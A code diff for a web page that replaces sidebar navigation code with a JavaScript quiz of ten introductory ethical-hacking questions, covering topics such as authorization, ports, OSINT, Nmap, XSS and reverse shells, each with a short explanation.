+  document.querySelectorAll('.res-panel').forEach((p,i)=>{
+    p.classList.toggle('active',i===idx);
+  });
+}
 
-  // Navigation active & smooth
-  window.addEventListener('scroll', () => {
-    const sections = document.querySelectorAll('section[id]');
-    let current = '';
-    sections.forEach(sec => { const rect = sec.getBoundingClientRect(); if(rect.top <= 150 && rect.bottom >= 100) current = sec.id; });
-    document.querySelectorAll('.sidebar nav a').forEach(link => { link.classList.remove('active'); if(link.getAttribute('href') === `#${current}`) link.classList.add('active'); });
+// ── QUIZ ──
+const Qs=[
+  {q:"What must you ALWAYS obtain before penetration testing a system?",opts:["A hacking tool","Written authorization from the owner","Admin credentials","A VPN connection"],c:1,e:"Written authorization is law. Without it, accessing any system is a crime — no matter your intentions. This is the golden rule of ethical hacking."},
+  {q:"Which port does HTTP use by default?",opts:["443","22","80","3389"],c:2,e:"HTTP uses port 80. HTTPS uses 443. SSH uses 22. RDP uses 3389. Knowing default ports is fundamental networking knowledge."},
+  {q:"What does 'OSINT' stand for?",opts:["Offensive Security Intelligence Toolkit","Open Source Intelligence","Online System Intrusion Technique","Operational Security Interest Network"],c:1,e:"Open Source Intelligence — gathering information from publicly available sources like websites, social media, job postings, and WHOIS records. Always legal and done before any active testing."},
+  {q:"Which Kali Linux tool is used for network scanning and port discovery?",opts:["Aircrack-ng","SQLmap","Nmap","Nikto"],c:2,e:"Nmap (Network Mapper) is the standard tool for discovering hosts, open ports, running services, and OS information. It's the first tool any ethical hacker learns."},
+  {q:"What vulnerability type is #1 on the OWASP Top 10 (2021)?",opts:["Cross-Site Scripting","SQL Injection","Broken Access Control","Cryptographic Failures"],c:2,e:"Broken Access Control topped the OWASP Top 10 in 2021. It includes IDOR (Insecure Direct Object References) where users can access resources they shouldn't be authorized to see."},
+  {q:"What does XSS stand for in web security?",opts:["Cross-Site Scripting","Cross-System Security","External Site Scanning","Cross-Service Session"],c:0,e:"Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages viewed by other users. The victim's browser executes the script, potentially stealing cookies or session tokens."},
+  {q:"Which tool is used for intercepting and modifying web application HTTP traffic?",opts:["Wireshark","Burp Suite","Nmap","Hashcat"],c:1,e:"Burp Suite acts as a proxy between your browser and the web application, letting you intercept, inspect, modify, and replay HTTP/HTTPS requests. The Community Edition is free."},
+  {q:"What is a 'reverse shell'?",opts:["A shell that encrypts traffic","A connection where the victim machine connects back to the attacker","A shell running in reverse order","A deprecated command-line tool"],c:1,e:"A reverse shell is when you make the compromised machine initiate the connection back to your listener. This bypasses many firewall rules since the traffic appears to originate from inside the network."},
+  {q:"What does 'privilege escalation' mean in pentesting?",opts:["Installing more tools on Kali","Gaining higher access rights than initially obtained","Escalating the pentest to management","Increasing network bandwidth"],c:1,e:"After initial access you often land as a low-privilege user. Privilege escalation means exploiting weaknesses to gain higher access — typically root on Linux or SYSTEM/Administrator on Windows."},
+  {q:"Which platform hosts intentionally vulnerable machines for legal hacking practice?",opts:["GitHub","Stack Overflow","HackTheBox","LinkedIn"],c:2,e:"HackTheBox (and TryHackMe) host intentionally vulnerable machines specifically for legal practice. They have explicit authorization to test — making them perfect ethical training grounds."}
+];
+let cur=0,score=0,ans=false;
+function loadQ(){
+  const q=Qs[cur];
+  document.getElementById('qp').textContent=`Question ${cur+1} of ${Qs.length}`;
+  document.getElementById('qbf').style.width=`${((cur+1)/Qs.length)*100}%`;
+  document.getElementById('qq').textContent=q.q;
+  document.getElementById('qfb').className='qfb';
+  document.getElementById('qnxt').style.display='none';
+  ans=false;
+  const o=document.getElementById('qo');o.innerHTML='';
+  q.opts.forEach((opt,i)=>{
+    const b=document.createElement('button');
+    b.className='qopt';b.textContent=`${String.fromCharCode(65+i)}. ${opt}`;
+    b.onclick=()=>pick(i);o.appendChild(b);
   });
-  document.querySelectorAll('.sidebar nav a').forEach(link => {
-    link.addEventListener('click', (e) => {
-      e.preventDefault();
-      const targetId = link.getAttribute('href').substring(1);
-      const target = document.getElementById(targetId);
-      if(target) { document.getElementById('globalSearch').value = ''; document.querySelectorAll('section').forEach(sec => sec.style.display = 'block'); target.scrollIntoView({ behavior: 'smooth' }); }
-    });
-  });
-
-  renderResources();
-  renderTools();
-  renderCerts();
+}
+function pick(i){
+  if(ans)return;ans=true;
+  const q=Qs[cur];
+  const bs=document.querySelectorAll('.qopt');
+  bs.forEach(b=>b.disabled=true);
+  bs[i].classList.add(i===q.c?'cor':'wrg');
+  if(i!==q.c)bs[q.c].classList.add('cor');
+  const fb=document.getElementById('qfb');
+  if(i===q.c){score++;fb.className='qfb ok show';fb.textContent='✓ Correct! '+q.e;}
+  else{fb.className='qfb no show';fb.textContent='✗ Wrong. '+q.e;}
+  document.getElementById('qs').textContent=score;
+  document.getElementById('qt').textContent=cur+1;
+  document.getElementById('qnxt').style.display='inline-block';
+  if(cur===Qs.length-1)document.getElementById('qnxt').textContent='SEE RESULTS';
+}
+function nextQ(){
+  cur++;
+  if(cur>=Qs.length){
+    const pct=Math.round(score/Qs.length*100);
+    const g=pct>=90?'🟢 ELITE':pct>=70?'🟡 SOLID':pct>=50?'🟠 LEARNING':'🔴 KEEP STUDYING';
+    document.getElementById('qq').textContent='Quiz Complete!';
+    document.getElementById('qo').innerHTML=`<div style="text-align:center;padding:2rem 0">
+      <div style="font-family:Orbitron,monospace;font-size:3.5rem;color:var(--g);text-shadow:0 0 20px var(--g);margin-bottom:0.5rem">${score}/${Qs.length}</div>
+      <div style="font-family:Share Tech Mono,monospace;font-size:1rem;color:var(--dim);margin-bottom:0.5rem">${pct}% — ${g}</div>
+      <div style="font-size:0.8rem;color:var(--dim);margin-bottom:1.5rem">${pct>=70?'Ready to move to the next module!':'Review the roadmap and try the free resources above, then come back.'}</div>
+      <button class="btn btn-g" onclick="restartQ()">RETRY QUIZ</button></div>`;
+    document.getElementById('qfb').className='qfb';
+    document.getElementById('qnxt').style.display='none';
+    document.getElementById('qp').textContent='Complete!';
+    document.getElementById('qbf').style.width='100%';
+    return;
+  }
+  loadQ();
+}
+function restartQ(){cur=0;score=0;document.getElementById('qs').textContent='0';document.getElementById('qt').textContent='0';loadQ();}
+loadQ();
 </script>
 </body>
 </html>
